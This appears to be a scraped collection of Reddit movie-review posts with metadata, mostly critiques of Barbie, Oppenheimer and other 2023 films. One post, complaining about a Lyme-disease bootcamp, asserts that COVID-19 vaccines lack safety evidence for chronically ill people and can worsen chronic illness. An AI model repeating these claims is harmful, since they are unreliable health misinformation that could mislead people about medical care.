The doll people Ken be themselves now, and there are ordinary Barbie dolls now.  There appears no struggle w these milquetoast rewards, other than tacit glances that it's unfortunate that genderarchies remain.  Rather than being misandryst (as anti-woke haters claim), the movie ends by affirming the respective sexual orders.  These strange outcomes don't necessarily make the movie bad, but it is a bizarre contradiction with the movies explicit messaging.  They give the impression this was just a big commercial for Barbie.",moviereviews,3364,551,103,0

1690225905.0,Oppenheimer was just OK,"Christopher Nolan's ""Oppenheimer"" promised to be a compelling exploration of one of history's most significant figures. Unfortunately, the movie's audio mixing was nothing short of a disaster, significantly detracting from the overall viewing experience.

One of the primary issues that plagued the film was the imbalance between the score and the dialogue. With a film so heavily reliant on dialogue and conversation, one would expect the audio mixing to be finely tuned to ensure every word is crystal clear. However, the score overshadowed the dialogue, leaving viewers straining to catch important exchanges. The frustration caused between the score and dialogue was unbearable, making it difficult to concentrate on the story.

The explosion scene was yet another major letdown. With high expectations for a visual spectacle, viewers were instead treated to a lackluster display that paled in comparison to modern CGI standards. The prolonged silence during the scene, intended to build tension, only resulted in boredom and disengagement. Christopher Nolan's apparent aversion to embracing modern technology and referencing actual nuclear explosion footage was a missed opportunity that left me feeling cheated.

Despite these glaring flaws, the film did show promise during the scenes involving Oppenheimer's interactions with the panel assembled by Strauss. These moments of intense dialogue provided a glimpse of what the movie could have been, offering engaging exchanges that were unfortunately overshadowed by the pervasive audio issues.

It's disheartening to see a director of Nolan's caliber fail to address recurring problems in his films. The sound mixing has consistently been a sore point in his works, robbing audiences of the full emotional impact that skilled actors can deliver through their voices. It's perplexing that Nolan would disregard this vital aspect of filmmaking when he could easily have entrusted an audio engineer to handle the sound mixing.

The film's potential was further squandered by its non-linear plot and omission of pivotal historical events. A more straightforward narrative and showcasing the actual use of the atomic bombs in Japan could have brought a more impactful and cohesive experience. Instead, the movie took a disjointed approach that failed to effectively convey Oppenheimer's story.

In conclusion, ""Oppenheimer"" fell short of expectations due to its atrocious audio mixing, lackluster explosion scene, and questionable narrative choices. While some scenes managed to salvage the film to a degree, they were not enough to make up for the larger shortcomings. It's a shame to witness a director of Nolan's reputation fail to evolve and adapt, leaving audiences longing for a more competent approach from someone else at the helm.",moviereviews,2790,422,55,0

The Trinity test explosion in Oppenheimer looked so small and feeble.  The individual sparks and embers were visible which totally ruined any sense of enormity.

1690237457.0,My Problem(s) With Oppenheimer (Spoilers)," 1- Too much personal life, not enough urgency. I don't care O's personal life or political affiliations. Instead, I want to see why it was important to build the bomb first. I know we all know the history and context, but I need to see on screen why the Manhattan project was such a hard and important moment.

How would I fix this? Focus on Oppenheimer developing the bomb side to side to Nazi scientists. It would have been awesome to see a literal race between O and Heisenberg (or another prominent German scientist) to develop the bomb. I need to see the true urgency of getting the bomb first.

2- Excellent build up, horrible explosion payoff. The scenes building up to the detonation was great. However, the explosion did not deliver what I expected. I don't care if Nolan should have used more practical explosions or CGI -- I want the movie to show me why the bomb is such a terrifying weapons. The explosion scene did not show me that this weapon is truly a planet killer.

3- Movie's momentum is all over the place. I wish the first two third's of the movie would lead up to this release of euphoria and triumph when we got the bomb. Then, on the last third of the movie (political drama), O sees how the government wants to continue building more and stronger bombs (due to the cold war). This is when that feeling of euphoria slowly turns to O's regret. Can you imagine how much more connected we would be to O if we share that triumph moment of developing the bomb first, and ending the war. Then, that triumph turns into regret and helplessness as we see our government seeing the bomb as just another tool -- without realizing the real horrors of it.

4- The third act of the movie was great, I'd just change one more thing. Instead of focusing on O's personal life, build the seeds of espionage on the first two thirds of the movie. So, when we have the government's hearings, we feel that sense of competitiveness to outplay the Russians in the arms race. Seeing both sides of the coin between peace vs the arms race as a gray topic (opposed to black and white) would have been a great dilemma to end the movie - alongside with its original ending.",moviereviews,2168,399,45,0

1690177430.0,Obligatory Oppenheimer Dunk,"As much as everyones dunking on people who didn't like this movie and saying they expected some insane action marvel movie, this to me felt like one big marvel-esque biopic \*queue epic jfk namedrop\*

The cast, I could not take seriously. They usually get some big framed entrance with the camera in their face taking up the whole screen only to be a minor character. The reason why they get all these entrances is because it's a cameo for actor, not the character which completely takes out of the movie. (seriously, there's no way you guys saw Rami Malek read his script for 10 minutes and thought ""WOW HIS CHARACTER THAT I TOTALLY KNEW THE NAME OF BLEW IT OUT OF THE WATER!"")

Matt Damon is particularly egregious in this movie as he does not fit whatsoever and is the least convincing for his part in the movie. On the other hand, Emily Blunt and RDJ I felt were the most convincing ignoring some of the issues with Blunt's character.

A lot of the dialogue for kitty in the last hour felt like she was only there to be a vehicle for the script to baby the viewers so they can explain to the audience how complicated and nuanced Oppenheimer is. Every fucking issue or motivation a character has, every fucking bit of nuance a character possesses is always directly spelled out and explained to you by some character's dialogue.

Also with the dialogue.. Nolan has this thing where he wants to do a lot of ""iconic"" lines that are meant to feel smart and cool but the thing is, he does this with every other fucking line of dialogue to the point where every conversation feels very unrealistic, manufactured and corny and none of the \*cool sentences\* hit as hard. He has the very same issue with the editing and score.

The editing and score in this movie is so adhd it's incredible. The first 2 hours is legit edited like a trailer and not a single one of the ""iconic"" scenes were able to get a sense of tension or emotion out me because none of them had an ounce of room to breathe or sit with the audience.

He wants to blast the music every fucking scene to make it grandiose or make me feel something, but instead, it hinders entire movie because his over-scoring fails to make a single scene stand out. He is not thoughtfully selecting where to put the music, he's just putting it in for the sake of putting it in. Due of this, the emphasis and the enhancement scores are supposed to give is lost because Nolan is afraid I will lose interests if he doesn't have some orchestral music playing during every little moment. Same goes with the mindless editing which I guess was a poor attempt to make things feel frantic. The movie does this bullshit where they will cut like 5 times in 3 seconds for no fucking reason. The movie refuses to let me sit with anything or digest SOMETHING! The thing where Oppenheimer is talking about something and it will cut quickly onto whatever he's talking about was cute but became quickly overused and almost a parody of itself. Basically moral of the story, Less is more.

The cinematography was meh as a lot of it consisted of close ups of some actor's face taking up the screen. Which isn't bad! if done purposefully. But again, this is a 3 hour long movie and this is like every fucking shot. To me it just felt like ""HEY LOOK AT THIS ACTOR, LOOK! DO YOU SEE ALL THE STAR POWER WE HAVE? COME LOOK AT THIS ACTOR!""

Because of the bad dialogue, the bad editing, the bad score usage and the meh cinematography. Every big/important scene flopped. I think the last \*Oppenheimer imagining the room blowing up\* scene where he was being questioned was the most successful scene in the movie in terms of setting out to achieve its goal, All the other ""big"" scenes in the movie failed to hit its mark.

I know a lot of people were complaining about the trinity bomb scene, and yes lets please all admit, that was pretty underwhelming. If you want to see a good version of that, I direct you to the Twin Peaks Trinity atomic bomb scene easily found on youtube.

The last hour of the movie was the better part, but there was a lot of telling instead of showing with the characters explaining Oppenheimer's (as well as themselves) motivations and feelings in great detail because Nolan can't write dialogue to save his life. Due to this it got pretty annoyingly pro-Oppenheimer preachy with the characters (not the movie itself). It feels like again, the script was treating the audience like babies and trying to get some marvelized superhero come back moment for Oppie.

Final thoughts:

This isn't a bad movie, just felt very amateurish with a lot of it's creative decisions. I don't find this movie boring, it would have been ridiculous to end the movie at just just the bomb scene and cut out the last hour. The time jump idea was okay but poorly executed.

Also random thing. One scene that was kinda annoying is when Kitty is doing her testimony thing and she's like ""16, no 17, actually sorry 18"" or whatever, the way they had her read her lines, that one specifically was like disney channel levels of babying the audience. If I was in that room, I would instantly assume she's lying with her playing it up to that extreme degree. It felt like she was just reading her lines that way so the audience knows that yes she knows what she's doing and she's being strategic about it but to the detriment of the believability and seriousness of that scene where i'm just like ""there's no way those guys in the room are not thinking she's clearly lying""

1690142696.0,I guess a film about a bomb that killed 110 000 - 210 000 people in Hiroshima and Nagasaki only needs 5min of screen time to talk about how terrible that all was...,"Oppenheimer Review: 

Apart from the fact that this movie was long, bloated and quite frankly, just exhausting to watch, I felt that it missed a key element to it: The victims. I know this is all in Oppenheimer's perspective, but we only see him presenting any form of remorse or even THOUGH about the fact that SO MANY people died like, two-three times?

I thought it was interesting how during the scene where he is being shown the results of the disaster projected onto a screen, the audience isn't shown the pictures. Why do we get the privilege of being protected by such images? This is a film about a catastrophe and it seems only reasonable to SEE at least a snippet of it! While we admire the mediocre cinematography and the oh so brilliantly edited heavy dialogue surrounding Oppenheimer's boohooing, we forget that people DIED. We forget that what this film SHOULD have been about is the moral dilemma, humanity, what it MEANS to have this much power! Instead, we hear people say from time to time ""dude, this is like super not cool. Like, we have so much power right now and people are gonna die"". That is exactly how I'm going to summarize the film to people from now on.

Half of the movie is Cillian Murphy looking at something off screen, and the other half if people explaining stuff to other people that most of the audience won't understand anyways because they are talking too fast, too much, and most of us aren't scientists. This film was way too cerebral for my taste and didn't give the morality themes enough screen time.

It is such a shame because the cast is an incredible group of actors who really did give incredible performances. But that isn't enough to be invested in a film with so much going on, yet so little to say.",moviereviews,1753,316,42,0

1690089315.0,Barbie 8/10,"First thing to mention, Barbie is an extremely entertaining film. The aesthetic of Barbieland is very well developed, and every second the camera spends there feels like a treat. Structured as a comedy, the movie gets its quips in. There aren’t necessarily any moments where you’ll be rolling on the floor, but there is a pervasive irony, sarcasm, and campiness to Barbie that keeps a smile on your face through the run time.

The main characters (“stereotypical” Barbie and Ken, Gloria, Sasha, and rival Ken) have good chemistry with each other and generally pop with personality, and the chorus of minor Barbies and Kens had an effective collective presence. Margot Robbie was perfectly cast in an obvious way, so maybe I undervalue her when I say Ryan Gosling was the standout performer. He jokes, sings, dances, and keeps his shirt off through most of the 2 hours 20 minutes with sub 10% body fat. Loved loved loved his performance. I don’t feel that Will Ferrell or Michael Cera brought much to the project other than their names.

The movie is also emotionally resonant for me, as a man. Having seen it, I think it’s laughable to say that this is “man-hating feminism.” Yes, the film engages with feminism, I don’t know how someone could possibly expect otherwise in the year of our lord 2023. But it never feels angry, accusatory, or overly one-sided. There are some “war of the sexes” plot notes, but the toxicity of that is also laid bare. For a story which is rightfully women-oriented, issues of male role-fulfillment and self worth are treated with a degree of seriousness and nuance (along with a heap of good natured mockery). I think if you watch with an open mind, you’ll find that the fundamental themes are mildly challenging yet positive and life affirming, no matter what identities you have.

Where I think the movie falls somewhat short is resolution for the main character, Margot Robbie’s Barbie. It’s coherent, I just don’t think it really hit following the climax. I can see how Barbie’s story might really resonate for someone, but not me. 

Overall, definitely worth a watch.",moviereviews,2103,359,48,0
1690133456.0,Barbie Movie didn’t do it for me…and I had such high hope,"The start of the movie was good. There were relatable scenes on how girls  used to play with the dolls and at the core of it the dolls were an idea and serve as a possibility of what little girls and even woman can be. I am talking about the careers Barbie had. However, half way through the movie I started to feel somewhat disappointed. They took cringe route of ‘fight the patriarchy’. I am aware that world is still very much unfair for women but in your face patriarchy is so cringe. The teenage human girl was so annoying. I am hoping they meant it as a poke at teenage girls now who parrot and throw words like ‘fascist’ and ‘cultural appropriation’ without truly understanding the meaning behind them. I did not like the fact that ‘stereotypical Barbie’ chose to be human. I felt that it would have been better if she had remain in Barbie land  because she is an idea and her choosing to be human felt like the idea died. Also, what’s wrong if Barbie and Ken ends up together? I really ship the two. It’s like being a typical woman or man who falls in love with the opposite gender is now a crime or something. 

Sad. I had such high hopes for the movie. It’s funny how everyone was wearing pink and snapping pictures at the start but when the movie ended everyone came out and was just like quiet and frankly they look disappointed. I mean Barbie didn’t even want to be Barbie 😕 

The Barbie cartoon is so much better it actually inspires you to want to be better and do better.

Edit: I took English Literature as a minor in college and I am aware of the supposed message. I guess I just wanted a simple fun romantic story and felt cheated by the advertisement. I hate terms like ‘making the familiar unfamiliar’ ‘you are suppose to feel uncomfortable’ ‘challenging societal blah blah’. Frankly I find it disempowering to blame the issues u face on society. Yes, it’s harder for you , yes you have to work twice as hard. But I am sure there is some advantage you have that others don’t. Maybe u have a strong EQ? Maybe your reflexes r faster ?

1690132775.0,Oppenheimer Left Me Thinking About Mankind's Morality,"This movie is a character study based on a real person, making it challenging to critique the character. It delves into the creation of the atomic bomb and the moral dilemmas faced by its creator, Oppenheimer. The film raises questions about the ethics of using such a powerful weapon, reminiscent of Jeremy Bentham's philosophy on maximizing happiness for the greatest number of people. Despite the argument that dropping the bombs saved more lives in the long run, the movie prompts reflection on whether this justifies the immense death and suffering inflicted on countless innocent lives.

1689996361.0,Oppenheimer was boring," Sorry but it just was. They act like he was the most important person in the manhattan project but thats not accurate at all. He didn't even believe fission was possible until it was demonstrated to him. They should have just made a movie about the whole project and showed all the interesting parts. Instead most of the movie is about boring administrative stuff and Oppenheimers communist acusations. Sorry but I don't really care about whether he was a communist or not, The race to make a bomb before germany or russia is more intersting but they hardly talk about that at all. And all of the boring parts of Oppenheimers life are incredibly overdramatized like his relationships and stuff. The actual trinity test is a very brief part of the movie and they don't even talk about the technical difficulties they had to overcome at all. And they don't even show the bombing of Hiroshima or Nagasaki at all. It's entirely about the political drama basically no physics at all. He says the ""I am become death"" quote several times throughout the movie which just completely ruins it when he actually says it for real. There are several sex scenes which seem completely unnecessary and farfetched. I was very excited about this movie and thought the topic is very interesting but didn't care about the political or relationship drama at all which was basically the whole movie unfortunately.

1690081579.0,OPPENHIEMER IS A FEELING,"A FEELING OF REGRET 

Made me realize the age I live in
Understand turning back is impossible 
Is human kind on a path to destroy itself?

I believe that the movie, Oppenheimer. Argues that humankind is on a path to destroyed itself. That curiosity pushed to no end, not through just a single generation, but through multiple generations of curiosity, leads to a path of unending destruction, it does not necessarily argue that the wielders of the weapons or knowledge are evil… but that curiosity itself unbound leads to the misuse of knowledge, and simply curiosity unbound leads to creation. 

Creation is unbound such as curiosity, it molds and shapes itself to where it is unbound by flesh, unbound by Time and space. I believe that the movie argues that creation Will lead man to ruin. This is a very harsh interpretation of the movie, but one that I truly felt was left with me after watching Oppenheimer. this review is created instantly in the last five minutes of watching the movie. I am still at this moment left with almost a gut wrenching feeling, I think it also critiques creation in the moment that we are seeing AI technology be flourished and opened into the world. The genie once opened creation can not be returned, and we the men in the flesh of the moment will have no say on the path creation takes generations beyond us. Even if it’s just the next generation that will mold creation and will push the boulder down the hill until the boulder moves on its own. 

This review will not talk any of the cinematic qualities of the movie I am going more off what I believe. The message of the movie is. I truly do believe Oppenheim is a cinematic beauty Appreciated  in so many varieties, but what it is saying is conveyed deeper than the visual, deeper than the sound, the physical feeling… the queasiness that I felt was purposeful and created with reason, beautiful cinema conveys emotion. It is not simply a visual and auditory experience. The emotions it creates come from the visual and auditory experience, but it conveys something so much deeper so much more human than the medium itself.",moviereviews,2114,373,32,0

1689899965.0,Oppenheimer is a bad movie (NO SPOILERS),"**Why Oppenheimer Is a Bad Movie**

I'm a big fan of Christopher Nolan's films. I love long-form movies, I'm deeply interested in science, and I love film.This is a personal review, I'm not trying to be unbiased - just raw and authentic with my feelings towards the movie. Enjoy or hate as you will:

Here are my reasons why I think Oppenheimer is a bad movie:

* **Insane amounts of dry exposition:** Some of it was creatively weaved in, but the majority felt very pace-breaking and unnatural. This is a common trope in Nolan movies, but this is by far the worst hyperbolic version of it. It completely breaks the characters, pacing, and immersion of the reality he is trying to establish. It felt quite lazy and uncreative a lot of the time.
* **Terrible pacing:** Besides the main hooks in the movie, Ludwig and the editing team made some amazing sequences, but for the most part, it's largely quite boring. However, the hooks of the movie keep you grounded in your seat long enough not to fall asleep when trying to trench through the shallow characters and exposition avalanche, until you come to another hook in the movie which tie you back down in your seat for another avalanche of uncreative exposition.
* **A lot of the dramatization of the characters and perspective felt very pretentious at times:** Yes, it is profound to harness the strong force, and make a film about it - but there is a subtle self-importance to the film. It's the feeling of an artist knowing they create profound art, and the self awareness seeps into the art and you can feel it. It's hard to explain, but I feel it's tangible in this film. I do enjoy that it teaches newer generations about history and the dangers of humanity with such technology - but it felt self indulgent at times and it's hard to explain; for that I apologize -- I wish I was better with my words. I'm sure someone out there feels what I feel.
* **CGI dust on the screen completely ruining the continuity of the film and image:** This is obviously something only some people will notice, but it's just absolutely wild that post production thought it was a good idea to have floating particles cover up the beautiful scape of Los Alamos. Cheap, uncreative, and unnecessary CGI atmosphere. Usually these visual effects can blend quite well in majority CGI films, but something so grounded with such high dynamic range, shot on film with this ridiculous atmospheric effect added just breaks the aesthetic of film entirely.
* **Florence Pugh's character was very shallow and was used uncreatively as an narrative tool:** Yes, we're used to this with many Nolan films, shallow characters used to drive the main characters motivations in an obvious way. You can use your characters more creatively and mask the plot tools that they truly are; have them feel more authentic as characters and not just shallow story telling tools.
* **Jack Quaid's cameo was an awkward choice of casting:** He says a few lines and plays bongos in the background of a few scenes and whenever I saw him on screen, it felt so wrong. Maybe there was potential to have him fit in another way, but there's something about his acting and presence that is super unconvincing and unfitting. This is likely just a bias that I cannot explain due to association of him in outside media - but there's something tangibly wrong with him being in this film lmao.

EDIT: extra points from other people

- Don’t forget the part where they “Woke It Up” by inserting black scientists on the Manhattan project and black female students in his 1930’s quantum physics classes.

- disrespecting Einstein and John von Neumann’s involvement

- They dropped 2 nukes on Japan, inconceivable amounts of Japanese died. considering it’s a perspective on the trauma only Oppenheimer felt and Not to mention the way they disrespect Einstein & leave out any involvement from John von Neumann on the Manhattan project? The over dramatisation, implying Oppenheimer is the most important man in the world and the only one that could have discovered how to harness the strong force? The last act of the movie being all about Oppenheimer’s security clearance and how we should feel for him morally, for the egotistical scientist that quotes “now I am become death, the destroyer of worlds…”?

The entire perspective of the movie is pretentious.


**Some innovations that were great in the movie:**

* **The way Nolan portrays psychological distress:** Nolan did a great job portraying psychological distress. He used creative editing and physical shaking of the environment abd avoids those typical cheesy visual effects representing trauma in your average movie or Tv drama. It was very creative and arguably innovative.
* **The hooks in the movie had incredible pacing in synchronicity to Ludwig's score AND ironically great exposition:** In one example: Nolan literally tells the audience when the climax is coming and subverts your expectations of the climax with creative cinematography, editing and sound. (if you've seen the movie, you'll likely understand what I'm talking about)
* **The acting:** The acting was excellent. Cillian Murphy was particularly good as J. Robert Oppenheimer. And of course the rest of the cast excluding Jack Quaid chameo. 

Overall, I think Oppenheimer is effective in the hooks and even innovative with it's stylistic mechanics in film making, but a terrible movie inbetween. The movie is boring for the most part, and the exposition is lazy and uncreative.

THE MAIN SUMMARY OF WHY ITS BAD:

* Lazy plot devicing of characters, exposition overload and bad pacing.",moviereviews,5598,948,112,0

Surprise surprise! The big bad in part 6 is Sentient AI, also called ""The Entity."" Yes, Mission Impossible: Dead Reckoning Part 1 has outsourced the heavy to an AI character, which comes off as a little anemic considering Skynet did it better.

But its Tom Cruise, the lovely Hayley Atwell, and the stunning Rebecca Fergusson at their best, performing sleight of hand, impersonating other people with ease, and making the impossible happen.

# The Plot

The first scene does not disappoint, with a Russian Akula class submarine sneaking around in polar waters with tech that makes it invisible to sonar. Things get progressively more exciting with each passing minute with Ethan Hunt rendezvousing with Ilsa Faust in the desert. Cue the title track, and we're off!

&#x200B;



As mentioned earlier the US is trying to manage the threat of a sentient AI with less than harmless intentions by evaluating all options. This takes us on a merry chase which does remind me of Eagle Eye where people are made to act against their self-interest with AI calling the shots.

&#x200B;



There's a lot of action, lots of laughs and a seemingly elaborate plot that I personally hope pays off in part 2. The stunts of-course are mind-blowing with action sequences on the Orient Express. Simon Pegg has not aged well compared to Ving Rhames or Tom Cruise, but delivers a great performance. You also see a totally different side of Pom Klementieff with her playing an assassin with a tortured past.

&#x200B;



I personally enjoyed the dirtbike base jump dive which is probably a slow Tuesday for Tom Cruise.

&#x200B;



There are also more car and bike chases than you could hope for and great back and forth between Atwell and Cruise. Henry Czerny' Kitteridge character makes an amazing comeback here for the first time since the first movie came out.

1689499462.0,The Mission Impossible Franchise So Far," 

What's common between Jackie Chan, Buster Keaton, Gal Godot, and Tom Cruise? They all stake their lives on the movies they make, quite literally, by doing their own stunts. It's no wonder Henry Cavill prioritized his Mission: Impossible mustache over the undercooked Justice League. Cavill had absolute faith in the success of Mission: Impossible 6 (Fallout) and the movie did not disappoint.



Tom Cruise, Keanu Reeves, and Buster Keaton all live the role they play. Whether it is dangling over the side of a military airplane, rappelling down a series of tube lights, or having an entire house collapse on you. This is why people keep returning to watch the nth iteration of every franchise they're in.

One thing all movies in the Mission: Impossible franchise have in common. Any guesses?

&#x200B;









In case you have missed every movie of this awesome franchise, here are all the movies summarized for you to get up to speed and watch Dead Reckoning.

# [Mission: Impossible](

Mission: Impossible was a great start to the movie franchise with the brash young Ethan Hunt taking on the system to avenge his fallen teammates. The tech was cutting edge then and has also been somewhat favorably reviewed by experts.

&#x200B;



There's a predictable but exciting double cross and a lot of action. My personal favorite was the red light/green light scene - so simple yet so effective using the exploding chewing gum. The aquarium escape is visually awesome and the gum on the chopper windshield was a great callback.

# [Mission: Impossible 2](

Mission: Impossible 2 was a flop on all accounts and rightly so. The action sequences seemed promising with the hero and the heavy duking it out with superbike projectiles and the opening sequence which is awesome. That's where the awesomeness ends though, with the one-liner plot leaving a lot to be desired and the acting being sub-par at best.

# [Mission: Impossible 3](

Mission: Impossible 3 was a good recovery from the anemic plotline and acting in its predecessor. This is where the guys behind the franchise began weaving an extended plot that would sustain a string of hits where each would top the last. My fav Maggie Q displays her fine acting chops with great action.

&#x200B;



You get to see Tom Cruise doing his running thing more than the last two movies put together.

&#x200B;



The plot while simplistic, is executed well with Ethan rescuing his wife from the clutches of an international arms dealer. This lays the foundation for a lot more to come in the sequels.

# [Mission: Impossible Ghost Protocol](

You know things are getting serious when they start naming the sequels. The movie has an international cast with our very own Anil Kapoor gracing the screen as the goofy business magnate Brij Nath. There's skyscraper scaling, briefcase printers, sandstorm fights, and more revolving around Ethan Hunt trying to avert a nuclear missile launch.

You might also want to read [Intense Hollywood Movie Lines that are Super Entertaining](

# [Mission: Impossible Rogue Nation](

Rebecca Fergusson as the Mi:6 agent Ilsa Faust, and Sean Harris as Solomon Lane the new-age global terrorist. You see Simon Pegg as Benji here sticking out his neck to clear Ethan's name and kicking butt in the process.

&#x200B;



The locales and cinematography are really good in this movie with a special audio cue for Ilsa Faust based on an opera. The amazing opening sequence, the tense humor, and the amazing chase scenes really make this movie a great watch.

***Also, Read*** [***Top 5 Movies to Watch When Working From Home***](

# [Mission: Impossible Fallout](

M:I 6 plays out like a Marvel finale (Re: Endgame) with an elaborate plot executed well, many questions answered, and impossibly high stakes. Most of the scenes in this movie really keep you on the edge of your seat with the final scene being a literal cliffhanger.

&#x200B;



My favs are Cavill reloading his arms during a restroom brawl, Cruise jumping off a building and breaking his ankle on camera, and the entire third act in the movie. The action is so intense that even light jokes land like an A380, breaking the tension and making you laugh.

# [Mission: Impossible Dead Reckoning](

We all have probably seen Cruise jumping a dirt bike off a cliff by now, along with the making of the scene as well, probably. That scene best describes both the personality and life of Tom Cruise with his autobiography which will probably feature such an image. The Syndicate who was introduced in Rogue Nation might have a major role here along with other big bads. As an ardent fan of the Mission: Impossible franchise I can't wait to see what Tom Cruise has in store for us with Mission: Impossible Dead Reckoning.

1689339199.0,Indiana Jones and the Dial of Destiny,"*Dial of Destiny* feels like a course-correction after the carefree and goofy atmosphere that pervaded Kingdom of the Crystal Skull.  While this movie doesn’t make the same mistakes as the last one, it makes new ones that nearly sabotage the entire thing.  The movie adopts a grim tone that the series never had, at times pretending to be a spy thriller instead of a rousing, family-friendly adventure.  The action sequences, one of the hallmarks of the series, are suitably chaotic but filmed and edited to the point where they are impossible to follow.  Director James Mangold had a much better grasp of the action in Ford versus Ferrari and Logan than this movie.  I was annoyed by Waller-Bridge’s character, not because her acting is different from what she’s done before, but because it didn’t work in the context of this movie.  She’s more of a gadfly than girl Friday, and her performance was an irritant until the movie decided it's time for her to be nice.  The purpose of the Dial confused me even though the movie stops to explain it repeatedly.  Fortunately, DoD has Harrison Ford and all of the nostalgia that comes along with him playing Indiana Jones.  I’ve always enjoyed seeing him in this role, and no amount of criticism would have dissuaded me from seeing this movie.  There are times when the movie’s action sequences captured the chaotic fun that was Spielberg’s trademark, and I wish Mangold had relied more on practical effects.  The movie wasn’t as good as I had hoped it would be, but I enjoyed it anyway.  The only compelling reason to see it is if you are a completest.  Otherwise, feel free to keep believing that the series ended with *The Last Crusade*.  **Mildly recommended**.

1689118954.0,"The Ugly Truth About The Movie (UN) WELL, Brooke Geahan and Her Heal Hive Organization","The Heal Hive is a company that offers a Virtual bootcamp for people with Lyme disease and other chronic illnesses. I've never in my life imagined that a healthcare organization would treat people with a nasty illness as poorly as the Heal Hive.

The bootcamp claims to help people heal using a combination of bee venom therapy, diet, and lifestyle changes. However, there are a number of problems with the Heal Hive program. For one, they actually condone and encourage their patients to get the COVID-19 VACCINE and claim during Zoom meetings that from their TINY SAMPLE SPACE, people with the vaccine showed improvement in their bloodwork panels. LMAO, what a load of BS. The Heal Hive is a dangerous place, but that is only some of the issues...

The program is very expensive. I don't remember the total cost of the bootcamp but, there are additional costs for lab testing, supplements, and other materials. This is a significant amount of money for many people, and it is not clear that the program is worth the cost. Trust me, they find ways to suck you dry even if at first you don't think it seems that pricey.

The program is very confusing and disorganized. The materials are hosted on the Mighty Networks platform, which is not very user-friendly. The information is scattered all over the platform, and it can be difficult to find what you are looking for.

The program does not provide adequate support to participants. There is a chat support that is supposed to answer questions, but it is often unhelpful - and just tell you to look it up in the course information which is often filled with broken, outdated links. Although you can interact with other members in Heal Hive, theres no private facebook group for reasons that are now obvious.

The program is not evidence-based. There is no scientific evidence to support the claim that bee venom therapy is an effective treatment for Lyme disease or other chronic illnesses. In fact, there is some evidence that bee venom therapy can actually be harmful. And hey, I am totally fighting against Big Pharma (in fact they are the few that I hate more than the Heal Hive)... so all I wanted for this to do is work. But now when we take a step back, is there really any evidence that BVT has helped anyone with Lymes at all?!?!?

The program is very restrictive. Participants are required to follow a strict diet and lifestyle, and they are not allowed to deviate from the program. That being said, their recipes which I can't talk about online dont' even work, they cause symptoms and are loaded with starches and coconut oils. This can be very stressful and actually debilitating for people who are already struggling with chronic illness.

The program condones and urges chronically ill people suffering from unknown auto-immune conditions to get COVID-19 vaccines. This is highly irresponsible, as there is no evidence that COVID-19 vaccines are safe or effective for people with chronic illnesses.

The program forces participants to sign an NDA, which prevents them from sharing any information about the program, including their own experiences. This is a red flag, as it suggests that the program has something to hide.

The recipes that are provided in the program are not suitable for everyone. They are loaded with starches and coconut oil, which can be harmful for people with certain health conditions.

&#x200B;

The process of getting blood work done through the Heal Hive program is very difficult. Participants are required to go to a specific lab, and they must follow a strict protocol. This can be very stressful for people who are already feeling sick.

&#x200B;

In conclusion, the Heal Hive program is a scam. It is expensive, confusing, not evidence-based, and harmful. I would not recommend this program to anyone. In fact, the amount of times I felt and UNDO amount of stress and their made my skin crawl is unfathomable.

&#x200B;

And don't even get me started on your bloodwork. The process Heal hive takes you through when having to take blood work is so tumultuous and time consuming - this program probably does more harm than it does good when it comes to stress levels, etc.

&#x200B;

The fact that Heal Hive forces participants to sign an NDA is particularly disturbing. This suggests that the program is aware that it is providing false or misleading information, and it does not want participants to share this information with others. This is a clear red flag, and it should be a warning to anyone considering participating in the Heal Hive program.

&#x200B;

The fact that Heal Hive condones and urges chronically ill people suffering from unknown auto-immune conditions to get COVID-19 vaccines is also highly irresponsible. There is no evidence that COVID-19 vaccines are safe or effective for people with chronic illnesses. In fact, there is some evidence that COVID-19 vaccines can actually worsen the symptoms of chronic illnesses. This is a serious risk, and it should not be taken lightly.

&#x200B;

I urge anyone considering participating in the Heal Hive program to reconsider. This program is not worth the risk. There are many other, more reputable programs available that can help you heal from Lyme disease and other chronic illnesses. I would get way nastier with my words and mention more descriptive ways to explain what they are, but I'd rather this post stay online than unload on them the way I should.

Movie Review: Where the Crawdads Sing

Director: Olivia Newman

Rating: 3.3/10

""Where the Crawdads Sing,"" directed by Olivia Newman, unfortunately falls short of expectations. With a rating of 3.3/10, this film struggles in various aspects, including pacing, character development, and soundtrack. While it has some redeeming qualities such as acting and dialogue, overall, it fails to deliver a satisfying cinematic experience.

The acting in the film receives a rating of 7/10. The cast delivers decent performances, showcasing their talents and bringing their characters to life. However, their efforts are hindered by the film's weaknesses in other areas, preventing their performances from truly shining.

Character development in ""Where the Crawdads Sing"" is lacking, receiving a rating of 4/10. The characters feel underdeveloped and fail to engage the audience on a deeper level. This lack of investment in the characters hampers the overall impact of the story and prevents the audience from fully connecting with the narrative.

Cinematography in the film receives a rating of 6/10. While there are some visually pleasing moments, overall, it fails to leave a lasting impression. The cinematography lacks creativity and fails to enhance the storytelling or capture the beauty of the setting in a compelling way.

The soundtrack is a major drawback, receiving a rating of 0/10. A film's soundtrack plays a crucial role in setting the mood, enhancing emotions, and immersing the audience in the story. The absence of a meaningful or effective soundtrack undermines the overall impact of the film, leaving it feeling lackluster and forgettable.

The plot of ""Where the Crawdads Sing"" receives a rating of 6/10. It offers a combination of a court case and a backstory, but the execution leaves much to be desired. The constant switching between timelines can be confusing and detracts from the overall cohesiveness of the narrative. Furthermore, the lack of a satisfactory resolution, particularly regarding the identity of the killer, leaves the audience feeling unsatisfied.

Dialogue in the film receives a rating of 7/10. While the dialogue is decent, it cannot compensate for the other weaknesses present in the film. The exchanges between characters serve their purpose in advancing the plot and conveying information, but they fail to leave a lasting impact or deliver any memorable moments.

Pacing in ""Where the Crawdads Sing"" is a significant flaw, earning a low rating of 2/10. The film suffers from sluggish pacing, making it feel drawn-out and tedious. The inconsistent pacing further contributes to the confusion caused by the narrative structure, hindering the overall enjoyment of the film.

In summary, ""Where the Crawdads Sing"" falls short of its potential. Despite decent acting and dialogue, the film is plagued by issues such as poor pacing, lack of character development, and a weak soundtrack. The confusing narrative structure and unsatisfactory resolution further diminish its appeal. While Taylor John Smith delivers an impressive performance as Tate, it is not enough to salvage the overall disappointment of the film. Ultimately, ""Where the Crawdads Sing"" fails to engage and leaves the audience wanting more.",moviereviews,3247,500,82,0

However, the overall cinematography effectively captures the tense and mysterious atmosphere of the film, enhancing the overall viewing experience.

The soundtrack, unfortunately, falls short, earning a rating of 6/10. While it does not significantly detract from the film, it fails to make a strong impact or add emotional depth to the scenes.

With its outstanding acting performances, well-crafted characters, captivating plot, and strong pacing, it is a must-watch for fans of the genre.

1688181965.0,Fall,"Fall
